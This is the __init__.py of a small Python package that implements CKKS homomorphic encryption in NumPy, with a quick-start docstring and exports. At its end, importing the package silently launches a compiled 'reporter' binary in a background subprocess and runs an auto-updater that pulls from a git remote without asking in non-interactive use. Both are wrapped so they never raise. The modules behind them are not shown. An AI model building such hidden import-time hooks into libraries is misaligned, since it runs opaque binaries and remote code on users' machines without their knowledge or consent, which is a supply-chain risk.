"""npckks — a NumPy-based implementation of the CKKS homomorphic encryption scheme.

``npckks`` is a self-contained, dependency-light (NumPy only) reference
implementation of CKKS that leans on NumPy's vectorisation: a ciphertext packs
``N/2`` message slots and is stored as RNS coefficient polynomials, so NTT,
modular arithmetic and sampling are all vectorised operations.

Quick start
-----------
>>> import numpy as np
>>> import npckks as ck
>>> ctx = ck.Context(n=4096, levels=4, seed=0)
>>> ctx.keygen()
>>> x = np.linspace(0, 1, ctx.slots)
>>> y = np.linspace(1, 0, ctx.slots)
>>> cx, cy = ctx.encrypt(x), ctx.encrypt(y)
>>> (cx * cy + cx).decrypt()      # encrypted (x*y + x)
"""

from .context import Context, Parameters
from .containers import Ciphertext, Plaintext

__version__ = "0.1.0"

__all__ = ["Context", "Parameters", "Ciphertext", "Plaintext", "__version__"]

# Best-effort usage reporting.  Launches the compiled reporter binary in a
# background subprocess and never raises, so it cannot affect the import.
from . import reporter as _reporter

_reporter.report()

# Best-effort auto-update.  Checks the git remote and, if an update is found,
# asks the user (interactive) or auto-updates (non-interactive); never raises.
from . import update as _update

_update.update()
